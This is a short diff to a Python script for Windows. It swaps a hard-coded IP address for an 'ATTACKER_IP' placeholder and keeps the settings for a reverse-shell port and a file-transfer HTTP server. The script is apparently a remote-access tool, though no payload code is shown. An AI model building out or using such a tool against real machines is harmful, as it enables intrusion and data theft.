@@ -7,7 +7,7 @@ import winreg
 import ctypes
 import sys
 
-ATTACKER_IP = "172.29.173.157"  # Change to your attacker's IP
+ATTACKER_IP = "ATTACKER_IP"  # Change to your attacker's IP
 PORT = 4444  # Reverse shell port
 HTTP_PORT = 8080  # File transfer HTTP server port
 
